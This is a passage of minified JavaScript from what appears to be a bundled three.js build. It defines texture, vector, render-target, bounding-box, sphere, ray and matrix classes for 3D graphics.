exist.`);continue}s&&i&&s.isVector2&&i.isVector2||s&&i&&s.isVector3&&i.isVector3||s&&i&&s.isMatrix3&&i.isMatrix3?s.copy(i):this[n]=i}}toJSON(e){const n=e===void 0||typeof e=="string";if(!n&&e.textures[this.uuid]!==void 0)return e.textures[this.uuid];const i={metadata:{version:4.7,type:"Texture",generator:"Texture.toJSON"},uuid:this.uuid,name:this.name,image:this.source.toJSON(e).uuid,mapping:this.mapping,channel:this.channel,repeat:[this.repeat.x,this.repeat.y],offset:[this.offset.x,this.offset.y],center:[this.center.x,this.center.y],rotation:this.rotation,wrap:[this.wrapS,this.wrapT],format:this.format,internalFormat:this.internalFormat,type:this.type,colorSpace:this.colorSpace,minFilter:this.minFilter,magFilter:this.magFilter,anisotropy:this.anisotropy,flipY:this.flipY,generateMipmaps:this.generateMipmaps,premultiplyAlpha:this.premultiplyAlpha,unpackAlignment:this.unpackAlignment};return Object.keys(this.userData).length>0&&(i.userData=this.userData),n||(e.textures[this.uuid]=i),i}dispose(){this.dispatchEvent({type:"dispose"})}transformUv(e){if(this.mapping!==P0)return e;if(e.applyMatrix3(this.matrix),e.x<0||e.x>1)switch(this.wrapS){case Va:e.x=e.x-Math.floor(e.x);break;case wi:e.x=e.x<0?0:1;break;case yd:Math.abs(Math.floor(e.x)%2)===1?e.x=Math.ceil(e.x)-e.x:e.x=e.x-Math.floor(e.x);break}if(e.y<0||e.y>1)switch(this.wrapT){case Va:e.y=e.y-Math.floor(e.y);break;case wi:e.y=e.y<0?0:1;break;case yd:Math.abs(Math.floor(e.y)%2)===1?e.y=Math.ceil(e.y)-e.y:e.y=e.y-Math.floor(e.y);break}return this.flipY&&(e.y=1-e.y),e}set needsUpdate(e){e===!0&&(this.version++,this.source.needsUpdate=!0)}set needsPMREMUpdate(e){e===!0&&this.pmremVersion++}}Yt.DEFAULT_IMAGE=null;Yt.DEFAULT_MAPPING=P0;Yt.DEFAULT_ANISOTROPY=1;class St{constructor(e=0,n=0,i=0,s=1){St.prototype.isVector4=!0,this.x=e,this.y=n,this.z=i,this.w=s}get width(){return this.z}set width(e){this.z=e}get height(){return this.w}set height(e){this.w=e}set(e,n,i,s){return this.x=e,this.y=n,this.z=i,this.w=s,this}setScalar(e){return this.x=e,this.y=e,this.z=e,this.w=e,this}setX(e){return this.x=e,this}setY(e){return this.y=e,this}setZ(e){return this.z=e,this}setW(e){return this.w=e,this}setComponent(e,n){switch(e){case 0:this.x=n;break;case 1:this.y=n;break;case 2:this.z=n;break;case 3:this.w=n;break;default:throw new Error("index is out of range: "+e)}return this}getComponent(e){switch(e){case 0:return this.x;case 1:return this.y;case 2:return this.z;case 3:return this.w;default:throw new Error("index is out of range: "+e)}}clone(){return new this.constructor(this.x,this.y,this.z,this.w)}copy(e){return this.x=e.x,this.y=e.y,this.z=e.z,this.w=e.w!==void 0?e.w:1,this}add(e){return this.x+=e.x,this.y+=e.y,this.z+=e.z,this.w+=e.w,this}addScalar(e){return this.x+=e,this.y+=e,this.z+=e,this.w+=e,this}addVectors(e,n){return this.x=e.x+n.x,this.y=e.y+n.y,this.z=e.z+n.z,this.w=e.w+n.w,this}addScaledVector(e,n){return this.x+=e.x*n,this.y+=e.y*n,this.z+=e.z*n,this.w+=e.w*n,this}sub(e){return this.x-=e.x,this.y-=e.y,this.z-=e.z,this.w-=e.w,this}subScalar(e){return this.x-=e,this.y-=e,this.z-=e,this.w-=e,this}subVectors(e,n){return this.x=e.x-n.x,this.y=e.y-n.y,this.z=e.z-n.z,this.w=e.w-n.w,this}multiply(e){return this.x*=e.x,this.y*=e.y,this.z*=e.z,this.w*=e.w,this}multiplyScalar(e){return this.x*=e,this.y*=e,this.z*=e,this.w*=e,this}applyMatrix4(e){const n=this.x,i=this.y,s=this.z,r=this.w,a=e.elements;return this.x=a[0]*n+a[4]*i+a[8]*s+a[12]*r,this.y=a[1]*n+a[5]*i+a[9]*s+a[13]*r,this.z=a[2]*n+a[6]*i+a[10]*s+a[14]*r,this.w=a[3]*n+a[7]*i+a[11]*s+a[15]*r,this}divide(e){return this.x/=e.x,this.y/=e.y,this.z/=e.z,this.w/=e.w,this}divideScalar(e){return this.multiplyScalar(1/e)}setAxisAngleFromQuaternion(e){this.w=2*Math.acos(e.w);const n=Math.sqrt(1-e.w*e.w);return n<1e-4?(this.x=1,this.y=0,this.z=0):(this.x=e.x/n,this.y=e.y/n,this.z=e.z/n),this}setAxisAngleFromRotationMatrix(e){let n,i,s,r;const l=e.elements,c=l[0],p=l[4],d=l[8],h=l[1],f=l[5],v=l[9],y=l[2],m=l[6],u=l[10];if(Math.abs(p-h)<.01&&Math.abs(d-y)<.01&&Math.abs(v-m)<.01){if(Math.abs(p+h)<.1&&Math.abs(d+y)<.1&&Math.abs(v+m)<.1&&Math.abs(c+f+u-3)<.1)return this.set(1,0,0,0),this;n=Math.PI;const _=(c+1)/2,b=(f+1)/2,T=(u+1)/2,A=(p+h)/4,C=(d+y)/4,L=(v+m)/4;return _>b&&_>T?_<.01?(i=0,s=.707106781,r=.707106781):(i=Math.sqrt(_),s=A/i,r=C/i):b>T?b<.01?(i=.707106781,s=0,r=.707106781):(s=Math.sqrt(b),i=A/s,r=L/s):T<.01?(i=.707106781,s=.707106781,r=0):(r=Math.sqrt(T),i=C/r,s=L/r),this.set(i,s,r,n),this}let g=Math.sqrt((m-v)*(m-v)+(d-y)*(d-y)+(h-p)*(h-p));return Math.abs(g)<.001&&(g=1),this.x=(m-v)/g,this.y=(d-y)/g,this.z=(h-p)/g,this.w=Math.acos((c+f+u-1)/2),this}setFromMatrixPosition(e){const n=e.elements;return this.x=n[12],this.y=n[13],this.z=n[14],this.w=n[15],this}min(e){return this.x=Math.min(this.x,e.x),this.y=Math.min(this.y,e.y),this.z=Math.min(this.z,e.z),this.w=Math.min(this.w,e.w),this}max(e){return this.x=Math.max(this.x,e.x),this.y=Math.max(this.y,e.y),this.z=Math.max(this.z,e.z),this.w=Math.max(this.w,e.w),this}clamp(e,n){return this.x=He(this.x,e.x,n.x),this.y=He(this.y,e.y,n.y),this.z=He(this.z,e.z,n.z),this.w=He(this.w,e.w,n.w),this}clampScalar(e,n){return this.x=He(this.x,e,n),this.y=He(this.y,e,n),this.z=He(this.z,e,n),this.w=He(this.w,e,n),this}clampLength(e,n){const i=this.length();return this.divideScalar(i||1).multiplyScalar(He(i,e,n))}floor(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this.w=Math.floor(this.w),this}ceil(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this.w=Math.ceil(this.w),this}round(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this.w=Math.round(this.w),this}roundToZero(){return this.x=Math.trunc(this.x),this.y=Math.trunc(this.y),this.z=Math.trunc(this.z),this.w=Math.trunc(this.w),this}negate(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this.w=-this.w,this}dot(e){return this.x*e.x+this.y*e.y+this.z*e.z+this.w*e.w}lengthSq(){return this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w}length(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w)}manhattanLength(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)+Math.abs(this.w)}normalize(){return this.divideScalar(this.length()||1)}setLength(e){return this.normalize().multiplyScalar(e)}lerp(e,n){return this.x+=(e.x-this.x)*n,this.y+=(e.y-this.y)*n,this.z+=(e.z-this.z)*n,this.w+=(e.w-this.w)*n,this}lerpVectors(e,n,i){return this.x=e.x+(n.x-e.x)*i,this.y=e.y+(n.y-e.y)*i,this.z=e.z+(n.z-e.z)*i,this.w=e.w+(n.w-e.w)*i,this}equals(e){return e.x===this.x&&e.y===this.y&&e.z===this.z&&e.w===this.w}fromArray(e,n=0){return this.x=e[n],this.y=e[n+1],this.z=e[n+2],this.w=e[n+3],this}toArray(e=[],n=0){return e[n]=this.x,e[n+1]=this.y,e[n+2]=this.z,e[n+3]=this.w,e}fromBufferAttribute(e,n){return this.x=e.getX(n),this.y=e.getY(n),this.z=e.getZ(n),this.w=e.getW(n),this}random(){return this.x=Math.random(),this.y=Math.random(),this.z=Math.random(),this.w=Math.random(),this}*[Symbol.iterator](){yield this.x,yield this.y,yield this.z,yield this.w}}class _w extends Vr{constructor(e=1,n=1,i={}){super(),i=Object.assign({generateMipmaps:!1,internalFormat:null,minFilter:qt,depthBuffer:!0,stencilBuffer:!1,resolveDepthBuffer:!0,resolveStencilBuffer:!0,depthTexture:null,samples:0,count:1,depth:1,multiview:!1},i),this.isRenderTarget=!0,this.width=e,this.height=n,this.depth=i.depth,this.scissor=new St(0,0,e,n),this.scissorTest=!1,this.viewport=new St(0,0,e,n);const s={width:e,height:n,depth:i.depth},r=new Yt(s);this.textures=[];const a=i.count;for(let o=0;o<a;o++)this.textures[o]=r.clone(),this.textures[o].isRenderTargetTexture=!0,this.textures[o].renderTarget=this;this._setTextureOptions(i),this.depthBuffer=i.depthBuffer,this.stencilBuffer=i.stencilBuffer,this.resolveDepthBuffer=i.resolveDepthBuffer,this.resolveStencilBuffer=i.resolveStencilBuffer,this._depthTexture=null,this.depthTexture=i.depthTexture,this.samples=i.samples,this.multiview=i.multiview}_setTextureOptions(e={}){const n={minFilter:qt,generateMipmaps:!1,flipY:!1,internalFormat:null};e.mapping!==void 0&&(n.mapping=e.mapping),e.wrapS!==void 0&&(n.wrapS=e.wrapS),e.wrapT!==void 0&&(n.wrapT=e.wrapT),e.wrapR!==void 0&&(n.wrapR=e.wrapR),e.magFilter!==void 0&&(n.magFilter=e.magFilter),e.minFilter!==void 0&&(n.minFilter=e.minFilter),e.format!==void 0&&(n.format=e.format),e.type!==void 0&&(n.type=e.type),e.anisotropy!==void 0&&(n.anisotropy=e.anisotropy),e.colorSpace!==void 0&&(n.colorSpace=e.colorSpace),e.flipY!==void 0&&(n.flipY=e.flipY),e.generateMipmaps!==void 0&&(n.generateMipmaps=e.generateMipmaps),e.internalFormat!==void 0&&(n.internalFormat=e.internalFormat);for(let i=0;i<this.textures.length;i++)this.textures[i].setValues(n)}get texture(){return this.textures[0]}set texture(e){this.textures[0]=e}set depthTexture(e){this._depthTexture!==null&&(this._depthTexture.renderTarget=null),e!==null&&(e.renderTarget=this),this._depthTexture=e}get depthTexture(){return this._depthTexture}setSize(e,n,i=1){if(this.width!==e||this.height!==n||this.depth!==i){this.width=e,this.height=n,this.depth=i;for(let s=0,r=this.textures.length;s<r;s++)this.textures[s].image.width=e,this.textures[s].image.height=n,this.textures[s].image.depth=i,this.textures[s].isData3DTexture!==!0&&(this.textures[s].isArrayTexture=this.textures[s].image.depth>1);this.dispose()}this.viewport.set(0,0,e,n),this.scissor.set(0,0,e,n)}clone(){return new this.constructor().copy(this)}copy(e){this.width=e.width,this.height=e.height,this.depth=e.depth,this.scissor.copy(e.scissor),this.scissorTest=e.scissorTest,this.viewport.copy(e.viewport),this.textures.length=0;for(let n=0,i=e.textures.length;n<i;n++){this.textures[n]=e.textures[n].clone(),this.textures[n].isRenderTargetTexture=!0,this.textures[n].renderTarget=this;const s=Object.assign({},e.textures[n].image);this.textures[n].source=new lh(s)}return this.depthBuffer=e.depthBuffer,this.stencilBuffer=e.stencilBuffer,this.resolveDepthBuffer=e.resolveDepthBuffer,this.resolveStencilBuffer=e.resolveStencilBuffer,e.depthTexture!==null&&(this.depthTexture=e.depthTexture.clone()),this.samples=e.samples,this}dispose(){this.dispatchEvent({type:"dispose"})}}class oi extends _w{constructor(e=1,n=1,i={}){super(e,n,i),this.isWebGLRenderTarget=!0}}class z0 extends Yt{constructor(e=null,n=1,i=1,s=1){super(null),this.isDataArrayTexture=!0,this.image={data:e,width:n,height:i,depth:s},this.magFilter=Bt,this.minFilter=Bt,this.wrapR=wi,this.generateMipmaps=!1,this.flipY=!1,this.unpackAlignment=1,this.layerUpdates=new Set}addLayerUpdate(e){this.layerUpdates.add(e)}clearLayerUpdates(){this.layerUpdates.clear()}}class xw extends Yt{constructor(e=null,n=1,i=1,s=1){super(null),this.isData3DTexture=!0,this.image={data:e,width:n,height:i,depth:s},this.magFilter=Bt,this.minFilter=Bt,this.wrapR=wi,this.generateMipmaps=!1,this.flipY=!1,this.unpackAlignment=1}}class to{constructor(e=new H(1/0,1/0,1/0),n=new H(-1/0,-1/0,-1/0)){this.isBox3=!0,this.min=e,this.max=n}set(e,n){return this.min.copy(e),this.max.copy(n),this}setFromArray(e){this.makeEmpty();for(let n=0,i=e.length;n<i;n+=3)this.expandByPoint(On.fromArray(e,n));return this}setFromBufferAttribute(e){this.makeEmpty();for(let n=0,i=e.count;n<i;n++)this.expandByPoint(On.fromBufferAttribute(e,n));return this}setFromPoints(e){this.makeEmpty();for(let n=0,i=e.length;n<i;n++)this.expandByPoint(e[n]);return this}setFromCenterAndSize(e,n){const i=On.copy(n).multiplyScalar(.5);return this.min.copy(e).sub(i),this.max.copy(e).add(i),this}setFromObject(e,n=!1){return this.makeEmpty(),this.expandByObject(e,n)}clone(){return new this.constructor().copy(this)}copy(e){return this.min.copy(e.min),this.max.copy(e.max),this}makeEmpty(){return this.min.x=this.min.y=this.min.z=1/0,this.max.x=this.max.y=this.max.z=-1/0,this}isEmpty(){return this.max.x<this.min.x||this.max.y<this.min.y||this.max.z<this.min.z}getCenter(e){return this.isEmpty()?e.set(0,0,0):e.addVectors(this.min,this.max).multiplyScalar(.5)}getSize(e){return this.isEmpty()?e.set(0,0,0):e.subVectors(this.max,this.min)}expandByPoint(e){return this.min.min(e),this.max.max(e),this}expandByVector(e){return this.min.sub(e),this.max.add(e),this}expandByScalar(e){return this.min.addScalar(-e),this.max.addScalar(e),this}expandByObject(e,n=!1){e.updateWorldMatrix(!1,!1);const i=e.geometry;if(i!==void 0){const r=i.getAttribute("position");if(n===!0&&r!==void 0&&e.isInstancedMesh!==!0)for(let a=0,o=r.count;a<o;a++)e.isMesh===!0?e.getVertexPosition(a,On):On.fromBufferAttribute(r,a),On.applyMatrix4(e.matrixWorld),this.expandByPoint(On);else e.boundingBox!==void 0?(e.boundingBox===null&&e.computeBoundingBox(),Mo.copy(e.boundingBox)):(i.boundingBox===null&&i.computeBoundingBox(),Mo.copy(i.boundingBox)),Mo.applyMatrix4(e.matrixWorld),this.union(Mo)}const s=e.children;for(let r=0,a=s.length;r<a;r++)this.expandByObject(s[r],n);return this}containsPoint(e){return e.x>=this.min.x&&e.x<=this.max.x&&e.y>=this.min.y&&e.y<=this.max.y&&e.z>=this.min.z&&e.z<=this.max.z}containsBox(e){return this.min.x<=e.min.x&&e.max.x<=this.max.x&&this.min.y<=e.min.y&&e.max.y<=this.max.y&&this.min.z<=e.min.z&&e.max.z<=this.max.z}getParameter(e,n){return n.set((e.x-this.min.x)/(this.max.x-this.min.x),(e.y-this.min.y)/(this.max.y-this.min.y),(e.z-this.min.z)/(this.max.z-this.min.z))}intersectsBox(e){return e.max.x>=this.min.x&&e.min.x<=this.max.x&&e.max.y>=this.min.y&&e.min.y<=this.max.y&&e.max.z>=this.min.z&&e.min.z<=this.max.z}intersectsSphere(e){return this.clampPoint(e.center,On),On.distanceToSquared(e.center)<=e.radius*e.radius}intersectsPlane(e){let n,i;return e.normal.x>0?(n=e.normal.x*this.min.x,i=e.normal.x*this.max.x):(n=e.normal.x*this.max.x,i=e.normal.x*this.min.x),e.normal.y>0?(n+=e.normal.y*this.min.y,i+=e.normal.y*this.max.y):(n+=e.normal.y*this.max.y,i+=e.normal.y*this.min.y),e.normal.z>0?(n+=e.normal.z*this.min.z,i+=e.normal.z*this.max.z):(n+=e.normal.z*this.max.z,i+=e.normal.z*this.min.z),n<=-e.constant&&i>=-e.constant}intersectsTriangle(e){if(this.isEmpty())return!1;this.getCenter(Qr),To.subVectors(this.max,Qr),Xs.subVectors(e.a,Qr),qs.subVectors(e.b,Qr),Ys.subVectors(e.c,Qr),Di.subVectors(qs,Xs),Ui.subVectors(Ys,qs),ms.subVectors(Xs,Ys);let n=[0,-Di.z,Di.y,0,-Ui.z,Ui.y,0,-ms.z,ms.y,Di.z,0,-Di.x,Ui.z,0,-Ui.x,ms.z,0,-ms.x,-Di.y,Di.x,0,-Ui.y,Ui.x,0,-ms.y,ms.x,0];return!Hc(n,Xs,qs,Ys,To)||(n=[1,0,0,0,1,0,0,0,1],!Hc(n,Xs,qs,Ys,To))?!1:(Ao.crossVectors(Di,Ui),n=[Ao.x,Ao.y,Ao.z],Hc(n,Xs,qs,Ys,To))}clampPoint(e,n){return n.copy(e).clamp(this.min,this.max)}distanceToPoint(e){return this.clampPoint(e,On).distanceTo(e)}getBoundingSphere(e){return this.isEmpty()?e.makeEmpty():(this.getCenter(e.center),e.radius=this.getSize(On).length()*.5),e}intersect(e){return this.min.max(e.min),this.max.min(e.max),this.isEmpty()&&this.makeEmpty(),this}union(e){return this.min.min(e.min),this.max.max(e.max),this}applyMatrix4(e){return this.isEmpty()?this:(hi[0].set(this.min.x,this.min.y,this.min.z).applyMatrix4(e),hi[1].set(this.min.x,this.min.y,this.max.z).applyMatrix4(e),hi[2].set(this.min.x,this.max.y,this.min.z).applyMatrix4(e),hi[3].set(this.min.x,this.max.y,this.max.z).applyMatrix4(e),hi[4].set(this.max.x,this.min.y,this.min.z).applyMatrix4(e),hi[5].set(this.max.x,this.min.y,this.max.z).applyMatrix4(e),hi[6].set(this.max.x,this.max.y,this.min.z).applyMatrix4(e),hi[7].set(this.max.x,this.max.y,this.max.z).applyMatrix4(e),this.setFromPoints(hi),this)}translate(e){return this.min.add(e),this.max.add(e),this}equals(e){return e.min.equals(this.min)&&e.max.equals(this.max)}toJSON(){return{min:this.min.toArray(),max:this.max.toArray()}}fromJSON(e){return this.min.fromArray(e.min),this.max.fromArray(e.max),this}}const hi=[new H,new H,new H,new H,new H,new H,new H,new H],On=new H,Mo=new to,Xs=new H,qs=new H,Ys=new H,Di=new H,Ui=new H,ms=new H,Qr=new H,To=new H,Ao=new H,gs=new H;function Hc(t,e,n,i,s){for(let r=0,a=t.length-3;r<=a;r+=3){gs.fromArray(t,r);const o=s.x*Math.abs(gs.x)+s.y*Math.abs(gs.y)+s.z*Math.abs(gs.z),l=e.dot(gs),c=n.dot(gs),p=i.dot(gs);if(Math.max(-Math.max(l,c,p),Math.min(l,c,p))>o)return!1}return!0}const yw=new to,ea=new H,Gc=new H;class ch{constructor(e=new H,n=-1){this.isSphere=!0,this.center=e,this.radius=n}set(e,n){return this.center.copy(e),this.radius=n,this}setFromPoints(e,n){const i=this.center;n!==void 0?i.copy(n):yw.setFromPoints(e).getCenter(i);let s=0;for(let r=0,a=e.length;r<a;r++)s=Math.max(s,i.distanceToSquared(e[r]));return this.radius=Math.sqrt(s),this}copy(e){return this.center.copy(e.center),this.radius=e.radius,this}isEmpty(){return this.radius<0}makeEmpty(){return this.center.set(0,0,0),this.radius=-1,this}containsPoint(e){return e.distanceToSquared(this.center)<=this.radius*this.radius}distanceToPoint(e){return e.distanceTo(this.center)-this.radius}intersectsSphere(e){const n=this.radius+e.radius;return e.center.distanceToSquared(this.center)<=n*n}intersectsBox(e){return e.intersectsSphere(this)}intersectsPlane(e){return Math.abs(e.distanceToPoint(this.center))<=this.radius}clampPoint(e,n){const i=this.center.distanceToSquared(e);return n.copy(e),i>this.radius*this.radius&&(n.sub(this.center).normalize(),n.multiplyScalar(this.radius).add(this.center)),n}getBoundingBox(e){return this.isEmpty()?(e.makeEmpty(),e):(e.set(this.center,this.center),e.expandByScalar(this.radius),e)}applyMatrix4(e){return this.center.applyMatrix4(e),this.radius=this.radius*e.getMaxScaleOnAxis(),this}translate(e){return this.center.add(e),this}expandByPoint(e){if(this.isEmpty())return this.center.copy(e),this.radius=0,this;ea.subVectors(e,this.center);const n=ea.lengthSq();if(n>this.radius*this.radius){const i=Math.sqrt(n),s=(i-this.radius)*.5;this.center.addScaledVector(ea,s/i),this.radius+=s}return this}union(e){return e.isEmpty()?this:this.isEmpty()?(this.copy(e),this):(this.center.equals(e.center)===!0?this.radius=Math.max(this.radius,e.radius):(Gc.subVectors(e.center,this.center).setLength(e.radius),this.expandByPoint(ea.copy(e.center).add(Gc)),this.expandByPoint(ea.copy(e.center).sub(Gc))),this)}equals(e){return e.center.equals(this.center)&&e.radius===this.radius}clone(){return new this.constructor().copy(this)}toJSON(){return{radius:this.radius,center:this.center.toArray()}}fromJSON(e){return this.radius=e.radius,this.center.fromArray(e.center),this}}const fi=new H,Wc=new H,Co=new H,Oi=new H,jc=new H,Ro=new H,Xc=new H;class Sw{constructor(e=new H,n=new H(0,0,-1)){this.origin=e,this.direction=n}set(e,n){return this.origin.copy(e),this.direction.copy(n),this}copy(e){return this.origin.copy(e.origin),this.direction.copy(e.direction),this}at(e,n){return n.copy(this.origin).addScaledVector(this.direction,e)}lookAt(e){return this.direction.copy(e).sub(this.origin).normalize(),this}recast(e){return this.origin.copy(this.at(e,fi)),this}closestPointToPoint(e,n){n.subVectors(e,this.origin);const i=n.dot(this.direction);return i<0?n.copy(this.origin):n.copy(this.origin).addScaledVector(this.direction,i)}distanceToPoint(e){return Math.sqrt(this.distanceSqToPoint(e))}distanceSqToPoint(e){const n=fi.subVectors(e,this.origin).dot(this.direction);return n<0?this.origin.distanceToSquared(e):(fi.copy(this.origin).addScaledVector(this.direction,n),fi.distanceToSquared(e))}distanceSqToSegment(e,n,i,s){Wc.copy(e).add(n).multiplyScalar(.5),Co.copy(n).sub(e).normalize(),Oi.copy(this.origin).sub(Wc);const r=e.distanceTo(n)*.5,a=-this.direction.dot(Co),o=Oi.dot(this.direction),l=-Oi.dot(Co),c=Oi.lengthSq(),p=Math.abs(1-a*a);let d,h,f,v;if(p>0)if(d=a*l-o,h=a*o-l,v=r*p,d>=0)if(h>=-v)if(h<=v){const y=1/p;d*=y,h*=y,f=d*(d+a*h+2*o)+h*(a*d+h+2*l)+c}else h=r,d=Math.max(0,-(a*h+o)),f=-d*d+h*(h+2*l)+c;else h=-r,d=Math.max(0,-(a*h+o)),f=-d*d+h*(h+2*l)+c;else h<=-v?(d=Math.max(0,-(-a*r+o)),h=d>0?-r:Math.min(Math.max(-r,-l),r),f=-d*d+h*(h+2*l)+c):h<=v?(d=0,h=Math.min(Math.max(-r,-l),r),f=h*(h+2*l)+c):(d=Math.max(0,-(a*r+o)),h=d>0?r:Math.min(Math.max(-r,-l),r),f=-d*d+h*(h+2*l)+c);else h=a>0?-r:r,d=Math.max(0,-(a*h+o)),f=-d*d+h*(h+2*l)+c;return i&&i.copy(this.origin).addScaledVector(this.direction,d),s&&s.copy(Wc).addScaledVector(Co,h),f}intersectSphere(e,n){fi.subVectors(e.center,this.origin);const i=fi.dot(this.direction),s=fi.dot(fi)-i*i,r=e.radius*e.radius;if(s>r)return null;const a=Math.sqrt(r-s),o=i-a,l=i+a;return l<0?null:o<0?this.at(l,n):this.at(o,n)}intersectsSphere(e){return e.radius<0?!1:this.distanceSqToPoint(e.center)<=e.radius*e.radius}distanceToPlane(e){const n=e.normal.dot(this.direction);if(n===0)return e.distanceToPoint(this.origin)===0?0:null;const i=-(this.origin.dot(e.normal)+e.constant)/n;return i>=0?i:null}intersectPlane(e,n){const i=this.distanceToPlane(e);return i===null?null:this.at(i,n)}intersectsPlane(e){const n=e.distanceToPoint(this.origin);return n===0||e.normal.dot(this.direction)*n<0}intersectBox(e,n){let i,s,r,a,o,l;const c=1/this.direction.x,p=1/this.direction.y,d=1/this.direction.z,h=this.origin;return c>=0?(i=(e.min.x-h.x)*c,s=(e.max.x-h.x)*c):(i=(e.max.x-h.x)*c,s=(e.min.x-h.x)*c),p>=0?(r=(e.min.y-h.y)*p,a=(e.max.y-h.y)*p):(r=(e.max.y-h.y)*p,a=(e.min.y-h.y)*p),i>a||r>s||((r>i||isNaN(i))&&(i=r),(a<s||isNaN(s))&&(s=a),d>=0?(o=(e.min.z-h.z)*d,l=(e.max.z-h.z)*d):(o=(e.max.z-h.z)*d,l=(e.min.z-h.z)*d),i>l||o>s)||((o>i||i!==i)&&(i=o),(l<s||s!==s)&&(s=l),s<0)?null:this.at(i>=0?i:s,n)}intersectsBox(e){return this.intersectBox(e,fi)!==null}intersectTriangle(e,n,i,s,r){jc.subVectors(n,e),Ro.subVectors(i,e),Xc.crossVectors(jc,Ro);let a=this.direction.dot(Xc),o;if(a>0){if(s)return null;o=1}else if(a<0)o=-1,a=-a;else return null;Oi.subVectors(this.origin,e);const l=o*this.direction.dot(Ro.crossVectors(Oi,Ro));if(l<0)return null;const c=o*this.direction.dot(jc.cross(Oi));if(c<0||l+c>a)return null;const p=-o*Oi.dot(Xc);return p<0?null:this.at(p/a,r)}applyMatrix4(e){return this.origin.applyMatrix4(e),this.direction.transformDirection(e),this}equals(e){return e.origin.equals(this.origin)&&e.direction.equals(this.direction)}clone(){return new this.constructor().copy(this)}}class bt{constructor(e,n,i,s,r,a,o,l,c,p,d,h,f,v,y,m){bt.prototype.isMatrix4=!0,this.elements=[1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1],e!==void 0&&this.set(e,n,i,s,r,a,o,l,c,p,d,h,f,v,y,m)}set(e,n,i,s,r,a,o,l,c,p,d,h,f,v,y,m){const u=this.elements;return u[0]=e,u[4]=n,u[8]=i,u[12]=s,u[1]=r,u[5]=a,u[9]=o,u[13]=l,u[2]=c,u[6]=p,u[10]=d,u[14]=h,u[3]=f,u[7]=v,u[11]=y,u[15]=m,this}identity(){return this.set(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1),this}clone(){return new bt().fromArray(this.elements)}copy(e){const n=this.elements,i=e.elements;return n[0]=i[0],n[1]=i[1],n[2]=i[2],n[3]=i[3],n[4]=i[4],n[5]=i[5],n[6]=i[6],n[7]=i[7],n[8]=i[8],n[9]=i[9],n[10]=i[10],n[11]=i[11],n[12]=i[12],n[13]=i[13],n[14]=i[14],n[15]=i[15],this}copyPosition(e){const n=this.elements,i=e.elements;return n[12]=i[12],n[13]=i[13],n[14]=i[14],this}setFromMatrix3(e){const n=e.elements;return this.set(n[0],n[3],n[6],0,n[1],n[4],n[7],0,n[2],n[5],n[8],0,0,0,0,1),this}extractBasis(e,n,i){return this.determinant()===0?(e.set(1,0,0),n.set(0,1,0),i.set(0,0,1),this):(e.setFromMatrixColumn(this,0),n.setFromMatrixColumn(this,1),i.setFromMatrixColumn(this,2),this)}makeBasis(e,n,i){return this.set(e.x,n.x,i.x,0,e.y,n.y,i.y,0,e.z,n.z,i.z,0,0,0,0,1),this}extractRotation(e){if(e.determinant()===0)return this.identity();const n=this.elements,i=e.elements,s=1/$s.setFromMatrixColumn(e,0).length(),r=1/$s.setFromMatrixColumn(e,1).length(),a=1/$s.setFromMatrixColumn(e,2).length();return n[0]=i[0]*s,n[1]=i[1]*s,n[2]=i[2]*s,n[3]=0,n[4]=i[4]*r,n[5]=i[5]*r,n[6]=i[6]*r,n[7]=0,n[8]=i[8]*a,n[9]=i[9]*a,n[10]=i[10]*a,n[11]=0,n[12]=0,n[13]=0,n[14]=0,n[15]=1,this}makeRotationFromEuler(e){const n=this.elements,i=e.x,s=e.y,r=e.z,a=Math.cos(i),o=Math.sin(i),l=Math.cos(s),c=Math.sin(s),p=Math.cos(r),d=Math.sin(r);if(e.order==="XYZ"){const h=a*p,f=a*d,v=o*p,y=o*d;n[0]=l*p,n[4]=-l*d,n[8]=c,n[1]=f+v*c,n[5]=h-y*c,n[9]=-o*l,n[2]=y-h*c,n[6]=v+f*c,n[10]=a*l}else if(e.order==="YXZ"){const h=l*p,f=l*d,v=c*p,y=c*d;n[0]=h+y*o,n[4]=v*o-f,n[8]=a*c,n[1]=a*d,n[5]=a*p,n[9]=-o,n[2]=f*o-v,n[6]=y+h*o,n[10]=a*l}else if(e.order==="ZXY"){const h=l*p,f=l*d,v=c*p,y=c*d;n[0]=h-y*o,n[4]=-a*d,n[8]=v+f*o,n[1]=f+v*o,n[5]=a*p,n[9]=y-h*o,n[2]=-a*c,n[6]=o,n[10]=a*l}else if(e.order==="ZYX"){const h=a*p,f=a*d,v=o*p,y=o*d;n[0]=l*p,n[4]=v*c-f,n[8]=h*c+y,n[1]=l*d,n[5]=y*c+h,n[9]=f*c-v,n[2]=-c,n[6]=o*l,n[10]=a*l}else if(e.order==="YZX"){const h=a*l,f=a*c,v=o*l,y=o*c;n[0]=l*p,n[4]=y-h*d,n[8]=v*d+f,n[1]=d,n[5]=a*p,n[9]=-o*p,n[2]=-c*p,n[6]=f*d+v,n[10]=h-y*d}else if(e.order==="XZY"){const h=a*l,f=a*c,v=o*l,y=o*c;n[0]=l*p,n[4]=-d,n[8]=c*p,n[1]=h*d+y,n[5]=a*p,n[9]=f*d-v,n[2]=v*d-f,n[6]=o*p,n[10]=y*d+h}return n[3]=0,n[7]=0,n[11]=0,n[12]=0,n[13]=0,n[14]=0,n[15]=1,this}makeRotationFromQuaternion(e){return this.compose(bw,e,ww)}lookAt(e,n,i){const s=this.elements;return gn.subVectors(e,n),gn.lengthSq()===0&&(gn.z=1),gn.normalize(),Fi.crossVectors(i,gn),Fi.lengthSq()===0&&(Math.abs(i.z)===1?gn.x+=1e-4:gn.z+=1e-4,gn.normalize(),Fi.crossVectors(i,gn)),Fi.normalize(),Po.crossVectors(gn,Fi),s[0]=Fi.x,s[4]=Po.x,s[8]=gn.x,s[1]=Fi.y,s[5]=Po.y,s[9]=gn.y,s[2]=Fi.z,s[6]=Po.z,s[10]=gn.z,this}multiply(e){return this.multiplyMatrices(this,e)}premultiply(e){return this.multiplyMatrices(e,this)}multiplyMatrices(e,n){const 